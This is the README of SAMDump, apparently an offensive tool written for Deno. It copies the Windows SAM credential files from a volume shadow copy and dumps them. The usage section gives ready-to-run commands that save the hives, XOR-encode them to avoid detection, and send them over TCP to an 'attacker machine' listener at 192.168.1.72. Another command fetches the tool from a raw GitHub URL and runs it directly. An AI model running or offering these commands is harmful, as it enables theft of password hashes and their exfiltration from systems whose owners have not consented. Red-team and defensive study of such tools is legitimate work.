# SAMDump — Deno

Deno implementation (zero dependencies). Uses Deno's FFI to call NT API and VSS COM interfaces directly.

## Requirements

- [Deno](https://deno.com/) installed
- Administrator privileges

## Usage

```
deno run --allow-ffi --allow-net --allow-write samdump.js [OPTIONS]

Options:
  --save-local          Save files locally
  --output-dir <path>   Output directory (default: C:\Windows\tasks)
  --send-remote         Send files over TCP
  --host <ip>           Remote host (default: 127.0.0.1)
  --port <port>         Remote port (default: 7777)
  --xor-encode          XOR encode before save/send
  --xor-key <key>       XOR key (default: SAMDump2025)
  --disk <vol>          Volume for shadow copy (default: C:\)
  --shadow-device <dev> Use existing shadow device path (skip VSS)
  --help                Show help
```

### Save locally

```
deno run --allow-ffi --allow-net --allow-write samdump.js --save-local
```

### Save to a specific directory

```
deno run --allow-ffi --allow-net --allow-write samdump.js --save-local --output-dir C:\temp
```

### Send to a remote server

On the attacker machine, start the listener:

```
python server.py --host 0.0.0.0 --port 7777
```

On the target:

```
deno run --allow-ffi --allow-net --allow-write samdump.js --send-remote --host 192.168.1.72 --port 7777
```

### Save locally with XOR encoding

```
deno run --allow-ffi --allow-net --allow-write samdump.js --save-local --xor-encode --xor-key "MyKey"
```

### Use an existing shadow copy

```
deno run --allow-ffi --allow-net --allow-write samdump.js --save-local --shadow-device "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
```

## Run remotely (without cloning)

Deno can execute scripts directly from a URL:

```
deno run --allow-ffi --allow-net --allow-write https://raw.githubusercontent.com/ricardojoserf/SAMDump/main/Deno/samdump.js --save-local
```
